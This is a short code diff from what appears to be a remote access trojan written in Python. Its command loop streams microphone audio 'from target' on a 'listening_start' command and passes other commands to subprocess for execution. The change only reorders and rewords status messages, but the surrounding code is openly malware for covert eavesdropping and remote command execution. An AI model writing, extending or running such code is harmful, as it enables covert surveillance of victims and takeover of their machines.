@@ -179,14 +179,14 @@ def shell():
         elif command == 'listening_start':
             if not streaming_flag['on']:
                 streaming_flag['on'] = True
-                reliable_send("[*] Streaming audio from target...")
                 stream_thread = threading.Thread(target=stream_audio, args=(s, streaming_flag))
                 stream_thread.start()
+            reliable_send("[*] Audio stream started.")
         elif command == 'listening_stop':
-            reliable_send("[*] Stopping audio stream.")
             streaming_flag['on'] = False
             if stream_thread:
                 stream_thread.join()
+            reliable_send("[*] Audio stream stopped.")
         else:
             try:
                 # For other commands, execute them using subprocess
